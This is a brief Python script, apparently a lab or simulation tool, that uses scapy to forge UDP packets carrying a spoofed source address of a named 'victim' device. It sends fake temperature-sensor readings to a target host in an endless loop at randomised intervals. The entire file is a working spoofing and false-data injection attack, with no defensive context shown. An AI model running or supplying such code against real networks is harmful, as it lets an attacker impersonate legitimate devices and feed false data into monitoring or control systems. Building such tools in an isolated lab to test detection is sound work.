from scapy.all import IP, UDP, Raw, send
import time, random

# Real device IP being duplicated
VICTIM_IP = "192.168.10.11"
TARGET_IP = "192.168.10.50"
TARGET_PORT = 5005

print("IP conflict device starting — forging packets from", VICTIM_IP, flush=True)

while True:
    try:
        pkt = IP(src=VICTIM_IP, dst=TARGET_IP) / \
              UDP(sport=random.randint(10000, 60000), dport=TARGET_PORT) / \
              Raw(load=b'sensor:real:temp:22.4')
        send(pkt, verbose=False)
        print(f"Forged packet sent from {VICTIM_IP}", flush=True)
    except Exception as e:
        print(f"Error: {e}", flush=True)
    time.sleep(random.uniform(3.0, 7.0))